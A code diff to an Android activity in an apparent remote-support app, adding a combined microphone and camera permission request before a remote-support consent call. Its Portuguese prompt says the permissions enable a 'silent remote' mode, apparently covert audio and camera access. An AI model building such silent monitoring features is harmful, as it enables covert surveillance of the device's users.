@@ -44,6 +44,7 @@ public class MainPermissionsActivity extends Activity {
     private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
     private static final String READ_MEDIA_AUDIO_PERMISSION = "android.permission.READ_MEDIA_AUDIO";
     private static final String READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION = "android.permission.READ_MEDIA_VISUAL_USER_SELECTED";
+    private volatile boolean pendingRemoteConsentAfterPermissions = false;
 
     @Override
     protected void onCreate(Bundle s) {
@@ -269,8 +270,19 @@ public class MainPermissionsActivity extends Activity {
         tvRemoteSupportState.setText("Sessão remota: " + friendlyType + " ativa (id: " + sessionId + ")");
     }
 
+    private boolean hasRemoteRuntimePermissions() {
+        return PermissionCompat.isGranted(this, Manifest.permission.RECORD_AUDIO)
+                && PermissionCompat.isGranted(this, Manifest.permission.CAMERA);
+    }
+
     private void grantRemoteSupportConsent() {
-        requestPermissionsIfNeeded(new String[]{Manifest.permission.RECORD_AUDIO});
+        if (!hasRemoteRuntimePermissions()) {
+            pendingRemoteConsentAfterPermissions = true;
+            requestPermissionsIfNeeded(new String[]{Manifest.permission.RECORD_AUDIO, Manifest.permission.CAMERA});
+            showMsg("Conceda áudio e câmara uma única vez para ativar o remoto silencioso");
+            return;
+        }
+        pendingRemoteConsentAfterPermissions = false;
         new Thread(() -> {
             try {
                 org.json.JSONObject body = new org.json.JSONObject();
@@ -340,6 +352,11 @@ public class MainPermissionsActivity extends Activity {
                 }
             }
             showMsg(ok ? "Permissões concedidas" : "Algumas permissões não concedidas");
+            if (ok && pendingRemoteConsentAfterPermissions) {
+                grantRemoteSupportConsent();
+            } else if (!ok) {
+                pendingRemoteConsentAfterPermissions = false;
+            }
         }
     }
 
